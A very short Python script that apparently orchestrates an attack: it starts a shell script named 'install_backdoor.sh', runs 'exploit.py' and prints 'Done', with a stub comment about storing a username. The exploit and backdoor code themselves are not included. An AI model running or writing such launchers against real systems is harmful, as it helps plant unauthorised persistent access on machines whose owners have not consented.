#!/bin/python3

import subprocess


install_backdoor_process = subprocess.Popen(["./install_backdoor.sh"])
subprocess.call(["python3", "exploit.py"])
install_backdoor_process.wait()


# Store username on a database somewhere

print("Done")
